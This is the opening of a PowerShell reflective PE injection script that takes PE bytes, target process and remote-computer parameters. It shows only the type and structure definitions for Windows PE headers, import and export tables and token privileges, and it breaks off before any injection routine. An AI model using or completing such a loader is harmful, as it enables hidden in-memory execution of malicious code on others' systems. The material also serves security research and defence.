function Invoke-ReflectivePEInjection
{

[CmdletBinding()]
Param(
    [Parameter(Position = 0, Mandatory = $true)]
    [ValidateNotNullOrEmpty()]
    [Byte[]]
    $PEBytes,
	
	[Parameter(Position = 1)]
	[String[]]
	$ComputerName,
	
	[Parameter(Position = 2)]
    [ValidateSet( 'WString', 'String', 'Void' )]
	[String]
	$FuncReturnType = 'Void',
	
	[Parameter(Position = 3)]
	[String]
	$ExeArgs,
	
	[Parameter(Position = 4)]
	[Int32]
	$ProcId,
	
	[Parameter(Position = 5)]
	[String]
	$ProcName,

    [Switch]
    $ForceASLR,

	[Switch]
	$DoNotZeroMZ
)

Set-StrictMode -Version 2


$RemoteScriptBlock = {
	[CmdletBinding()]
	Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Byte[]]
		$PEBytes,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[String]
		$FuncReturnType,
				
		[Parameter(Position = 2, Mandatory = $true)]
		[Int32]
		$ProcId,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[String]
		$ProcName,

        [Parameter(Position = 4, Mandatory = $true)]
        [Bool]
        $ForceASLR
	)
	
	###################################
	##########  Win32 Stuff  ##########
	###################################
	Function Get-Win32Types
	{
		$Win32Types = New-Object System.Object

		#Define all the structures/enums that will be used
		#	This article shows you how to do this with reflection: http://www.exploit-monday.com/2012/07/structs-and-enums-using-reflection.html
		$Domain = [AppDomain]::CurrentDomain
		$DynamicAssembly = New-Object System.Reflection.AssemblyName('DynamicAssembly')
		$AssemblyBuilder = $Domain.DefineDynamicAssembly($DynamicAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
		$ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('DynamicModule', $false)
		$ConstructorInfo = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]


		############    ENUM    ############
		#Enum MachineType
		$TypeBuilder = $ModuleBuilder.DefineEnum('MachineType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('Native', [UInt16] 0) | Out-Null
		$TypeBuilder.DefineLiteral('I386', [UInt16] 0x014c) | Out-Null
		$TypeBuilder.DefineLiteral('Itanium', [UInt16] 0x0200) | Out-Null
		$TypeBuilder.DefineLiteral('x64', [UInt16] 0x8664) | Out-Null
		$MachineType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name MachineType -Value $MachineType

		#Enum MagicType
		$TypeBuilder = $ModuleBuilder.DefineEnum('MagicType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR32_MAGIC', [UInt16] 0x10b) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR64_MAGIC', [UInt16] 0x20b) | Out-Null
		$MagicType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name MagicType -Value $MagicType

		#Enum SubSystemType
		$TypeBuilder = $ModuleBuilder.DefineEnum('SubSystemType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_UNKNOWN', [UInt16] 0) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_NATIVE', [UInt16] 1) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_GUI', [UInt16] 2) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CUI', [UInt16] 3) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_POSIX_CUI', [UInt16] 7) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CE_GUI', [UInt16] 9) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_APPLICATION', [UInt16] 10) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_BOOT_SERVICE_DRIVER', [UInt16] 11) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_RUNTIME_DRIVER', [UInt16] 12) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_ROM', [UInt16] 13) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_XBOX', [UInt16] 14) | Out-Null
		$SubSystemType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name SubSystemType -Value $SubSystemType

		#Enum DllCharacteristicsType
		$TypeBuilder = $ModuleBuilder.DefineEnum('DllCharacteristicsType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('RES_0', [UInt16] 0x0001) | Out-Null
		$TypeBuilder.DefineLiteral('RES_1', [UInt16] 0x0002) | Out-Null
		$TypeBuilder.DefineLiteral('RES_2', [UInt16] 0x0004) | Out-Null
		$TypeBuilder.DefineLiteral('RES_3', [UInt16] 0x0008) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE', [UInt16] 0x0040) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_FORCE_INTEGRITY', [UInt16] 0x0080) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_NX_COMPAT', [UInt16] 0x0100) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_ISOLATION', [UInt16] 0x0200) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_SEH', [UInt16] 0x0400) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_BIND', [UInt16] 0x0800) | Out-Null
		$TypeBuilder.DefineLiteral('RES_4', [UInt16] 0x1000) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_WDM_DRIVER', [UInt16] 0x2000) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE', [UInt16] 0x8000) | Out-Null
		$DllCharacteristicsType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name DllCharacteristicsType -Value $DllCharacteristicsType

		###########    STRUCT    ###########
		#Struct IMAGE_DATA_DIRECTORY
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DATA_DIRECTORY', $Attributes, [System.ValueType], 8)
		($TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public')).SetOffset(0) | Out-Null
		($TypeBuilder.DefineField('Size', [UInt32], 'Public')).SetOffset(4) | Out-Null
		$IMAGE_DATA_DIRECTORY = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DATA_DIRECTORY -Value $IMAGE_DATA_DIRECTORY

		#Struct IMAGE_FILE_HEADER
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_FILE_HEADER', $Attributes, [System.ValueType], 20)
		$TypeBuilder.DefineField('Machine', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfSections', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToSymbolTable', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfSymbols', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('SizeOfOptionalHeader', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('Characteristics', [UInt16], 'Public') | Out-Null
		$IMAGE_FILE_HEADER = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_HEADER -Value $IMAGE_FILE_HEADER

		#Struct IMAGE_OPTIONAL_HEADER64
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER64', $Attributes, [System.ValueType], 240)
		($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
		($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
		($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
		($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
		($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
		($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
		($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
		($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
		($TypeBuilder.DefineField('ImageBase', [UInt64], 'Public')).SetOffset(24) | Out-Null
		($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
		($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
		($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
		($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
		($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
		($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
		($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
		($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
		($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
		($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
		($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
		($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
		($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackReserve', [UInt64], 'Public')).SetOffset(72) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackCommit', [UInt64], 'Public')).SetOffset(80) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt64], 'Public')).SetOffset(88) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt64], 'Public')).SetOffset(96) | Out-Null
		($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(104) | Out-Null
		($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(108) | Out-Null
		($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
		($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
		($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
		($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
		($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
		($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
		($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
		($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
		($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
		($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
		($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
		($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
		($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
		($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
		($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(224) | Out-Null
		($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(232) | Out-Null
		$IMAGE_OPTIONAL_HEADER64 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER64 -Value $IMAGE_OPTIONAL_HEADER64

		#Struct IMAGE_OPTIONAL_HEADER32
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER32', $Attributes, [System.ValueType], 224)
		($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
		($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
		($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
		($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
		($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
		($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
		($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
		($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
		($TypeBuilder.DefineField('BaseOfData', [UInt32], 'Public')).SetOffset(24) | Out-Null
		($TypeBuilder.DefineField('ImageBase', [UInt32], 'Public')).SetOffset(28) | Out-Null
		($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
		($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
		($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
		($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
		($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
		($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
		($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
		($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
		($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
		($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
		($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
		($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
		($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackReserve', [UInt32], 'Public')).SetOffset(72) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackCommit', [UInt32], 'Public')).SetOffset(76) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt32], 'Public')).SetOffset(80) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt32], 'Public')).SetOffset(84) | Out-Null
		($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(88) | Out-Null
		($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(92) | Out-Null
		($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(96) | Out-Null
		($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(104) | Out-Null
		($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
		($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
		($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
		($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
		($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
		($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
		($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
		($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
		($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
		($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
		($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
		($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
		($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
		($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
		$IMAGE_OPTIONAL_HEADER32 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER32 -Value $IMAGE_OPTIONAL_HEADER32

		#Struct IMAGE_NT_HEADERS64
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS64', $Attributes, [System.ValueType], 264)
		$TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null
		$TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER64, 'Public') | Out-Null
		$IMAGE_NT_HEADERS64 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS64 -Value $IMAGE_NT_HEADERS64
		
		#Struct IMAGE_NT_HEADERS32
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS32', $Attributes, [System.ValueType], 248)
		$TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null
		$TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER32, 'Public') | Out-Null
		$IMAGE_NT_HEADERS32 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS32 -Value $IMAGE_NT_HEADERS32

		#Struct IMAGE_DOS_HEADER
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DOS_HEADER', $Attributes, [System.ValueType], 64)
		$TypeBuilder.DefineField('e_magic', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cblp', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cp', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_crlc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cparhdr', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_minalloc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_maxalloc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_ss', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_sp', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_csum', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_ip', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cs', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_lfarlc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_ovno', [UInt16], 'Public') | Out-Null

		$e_resField = $TypeBuilder.DefineField('e_res', [UInt16[]], 'Public, HasFieldMarshal')
		$ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$FieldArray = @([System.Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))
		$AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 4))
		$e_resField.SetCustomAttribute($AttribBuilder)

		$TypeBuilder.DefineField('e_oemid', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_oeminfo', [UInt16], 'Public') | Out-Null

		$e_res2Field = $TypeBuilder.DefineField('e_res2', [UInt16[]], 'Public, HasFieldMarshal')
		$ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 10))
		$e_res2Field.SetCustomAttribute($AttribBuilder)

		$TypeBuilder.DefineField('e_lfanew', [Int32], 'Public') | Out-Null
		$IMAGE_DOS_HEADER = $TypeBuilder.CreateType()	
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DOS_HEADER -Value $IMAGE_DOS_HEADER

		#Struct IMAGE_SECTION_HEADER
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_SECTION_HEADER', $Attributes, [System.ValueType], 40)

		$nameField = $TypeBuilder.DefineField('Name', [Char[]], 'Public, HasFieldMarshal')
		$ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 8))
		$nameField.SetCustomAttribute($AttribBuilder)

		$TypeBuilder.DefineField('VirtualSize', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('SizeOfRawData', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToRawData', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToRelocations', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToLinenumbers', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfRelocations', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfLinenumbers', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$IMAGE_SECTION_HEADER = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_SECTION_HEADER -Value $IMAGE_SECTION_HEADER

		#Struct IMAGE_BASE_RELOCATION
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_BASE_RELOCATION', $Attributes, [System.ValueType], 8)
		$TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('SizeOfBlock', [UInt32], 'Public') | Out-Null
		$IMAGE_BASE_RELOCATION = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_BASE_RELOCATION -Value $IMAGE_BASE_RELOCATION

		#Struct IMAGE_IMPORT_DESCRIPTOR
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_IMPORT_DESCRIPTOR', $Attributes, [System.ValueType], 20)
		$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('ForwarderChain', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('FirstThunk', [UInt32], 'Public') | Out-Null
		$IMAGE_IMPORT_DESCRIPTOR = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_IMPORT_DESCRIPTOR -Value $IMAGE_IMPORT_DESCRIPTOR

		#Struct IMAGE_EXPORT_DIRECTORY
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_EXPORT_DIRECTORY', $Attributes, [System.ValueType], 40)
		$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('MajorVersion', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('MinorVersion', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('Base', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfFunctions', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfNames', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('AddressOfFunctions', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('AddressOfNames', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('AddressOfNameOrdinals', [UInt32], 'Public') | Out-Null
		$IMAGE_EXPORT_DIRECTORY = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_EXPORT_DIRECTORY -Value $IMAGE_EXPORT_DIRECTORY
		
		#Struct LUID
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('LUID', $Attributes, [System.ValueType], 8)
		$TypeBuilder.DefineField('LowPart', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('HighPart', [UInt32], 'Public') | Out-Null
		$LUID = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name LUID -Value $LUID
		
		#Struct LUID_AND_ATTRIBUTES
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('LUID_AND_ATTRIBUTES', $Attributes, [System.ValueType], 12)
		$TypeBuilder.DefineField('Luid', $LUID, 'Public') | Out-Null
		$TypeBuilder.DefineField('Attributes', [UInt32], 'Public') | Out-Null
		$LUID_AND_ATTRIBUTES = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name LUID_AND_ATTRIBUTES -Value $LUID_AND_ATTRIBUTES
		
		#Struct TOKEN_PRIVILEGES
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('TOKEN_PRIVILEGES', $Attributes, [System.ValueType], 16)
		$TypeBuilder.DefineField('PrivilegeCount', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('Privileges', $LUID_AND_ATTRIBUTES, 'Public') | Out-Null
		$TOKEN_PRIVILEGES = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name TOKEN_PRIVILEGES -Value $TOKEN_PRIVILEGES

		return $Win32Types
	}

	Function Get-Win32Constants
	{
		$Win32Constants = New-Object System.Object
		
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_COMMIT -Value 0x00001000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RESERVE -Value 0x00002000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOACCESS -Value 0x01
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READONLY -Value 0x02
